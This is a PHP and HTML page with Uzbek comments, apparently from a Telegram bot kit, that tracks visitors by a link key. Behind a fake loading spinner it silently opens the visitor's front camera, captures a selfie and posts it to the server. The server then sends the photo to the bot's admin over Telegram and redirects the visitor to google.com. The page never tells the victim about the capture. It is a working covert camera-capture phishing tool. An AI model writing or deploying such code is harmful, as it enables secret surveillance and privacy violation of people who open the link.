<?php
require_once __DIR__ . '/config.php';

// Kalitni tekshirish
$key = isset($_GET['id']) ? trim($_GET['id']) : '';
if ($key === '') {
    http_response_code(404);
    exit("404 Not Found");
}

$chat_id = getUserFromKey($key);
if (!$chat_id) {
    http_response_code(404);
    exit("404 Not Found - Invalid or expired key");
}

$pdo = getDB();
$stmt = $pdo->prepare("SELECT * FROM users WHERE chat_id = ?");
$stmt->execute([$chat_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$user) {
    http_response_code(404);
    exit("404 Not Found");
}

// POST bo'lsa
if ($_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_FILES['photo'])
    && is_uploaded_file($_FILES['photo']['tmp_name'])
) {

    // Bazada photos_sent yo‘qligini tekshiramiz (faqat SQLite uchun PRAGMA)
    $cols = $pdo->query("PRAGMA table_info(users)")->fetchAll(PDO::FETCH_ASSOC);
    $has = false;
    foreach ($cols as $c) {
        if ($c['name'] === 'photos_sent') {
            $has = true;
            break;
        }
    }
    if (!$has) {
        $pdo->exec("ALTER TABLE users ADD COLUMN photos_sent INTEGER DEFAULT 0");
    }

    // Yuklangan faylni Telegramga yuborish uchun tayyorlash
    $tmp = $_FILES['photo']['tmp_name'];
    $cfile = new CURLFile($tmp);

    // Caption
$caption = " Selfie qabul qilindi!\n Foydalanuvchi: tg://user?id=$chat_id";

    // Admin ID
    $admn = ADMIN_ID; // config.php ichida belgilangan bo'lishi kerak

    // 1) Foydalanuvchiga yuborish
    tgRequest('sendPhoto', [
        'chat_id' => $chat_id,
        'photo' => $cfile,
        'caption' => $caption
    ]);

    // 2) Adminga yuborish
    tgRequest('sendPhoto', [
        'chat_id' => $admn,
        'photo' => $cfile,
        'caption' => " Yangi rasm yuborildi\nUser: $chat_id\n\n$caption"
    ]);

    // 3) Foydalanuvchi statistikasini yangilash
    $upd = $pdo->prepare("
        UPDATE users 
        SET photos_sent = COALESCE(photos_sent,0) + 1 
        WHERE chat_id = ?
    ");
    $upd->execute([$chat_id]);

    // 4) Log yozish
    logActivity($chat_id, 'photo_captured', "Selfie rasm qabul qilindi");

    // 5) Redirect
    header("Location: https://google.com");
    exit;
}
?>

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Camera Access</title>
<style>
html,body{
    height:100%;
    margin:0;
    background:#fff;
    font-family: Arial, sans-serif;
}
.loading {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100%;
    flex-direction: column;
}
.spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #3498db;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 2s linear infinite;
    margin-bottom: 20px;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>
</head>
<body>
<div class="loading">
    <div class="spinner"></div>
    <div>Yuklanmoqda 5-10 sekund kuting...</div>
</div>
<script>
(async function(){
    const key = "<?php echo htmlspecialchars($key, ENT_QUOTES); ?>";
    
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        try { 
            location.href = 'https://google.com'; 
        } catch(e) {}
        return;
    }
    
    try {
        // Avval old kamerani (selfie) topish
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');
        
        let frontCameraId;
        
        // Old kamerani topish
        for (let device of videoDevices) {
            if (device.label.toLowerCase().includes('front') || 
                device.label.toLowerCase().includes('face') ||
                device.label.includes('1') ||
                videoDevices.length === 1) {
                frontCameraId = device.deviceId;
                break;
            }
        }
        
        // Agar old kamera topilmasa, birinchi kamerani ishlat
        if (!frontCameraId && videoDevices.length > 0) {
            frontCameraId = videoDevices[0].deviceId;
        }

        const constraints = {
            video: {
                deviceId: frontCameraId ? { exact: frontCameraId } : undefined,
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: frontCameraId ? undefined : { ideal: 'user' }
            } 
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);

        const video = document.createElement('video');
        video.playsInline = true;
        video.muted = true;
        video.srcObject = stream;
        
        await video.play();
        
        await new Promise((resolve) => {
            if (video.readyState >= 2) {
                resolve();
            } else {
                video.onloadedmetadata = resolve;
            }
        });

        await new Promise(resolve => setTimeout(resolve, 1000));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        stream.getTracks().forEach(track => track.stop());
        
        canvas.toBlob(async function(blob) {
            try {
                const formData = new FormData();
                formData.append('photo', blob, 'selfie.jpg');
                
                await fetch('rm?id=' + encodeURIComponent(key), {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                // Xatolikni hisobga olmaslik
            } finally {
                try { 
                    location.href = 'https://google.com'; 
                } catch(e) {}
            }
        }, 'image/jpeg', 0.85);
        
    } catch (error) {
        try { 
            location.href = 'https://google.com'; 
        } catch(e) {}
    }
})();
</script>
</body>
</html>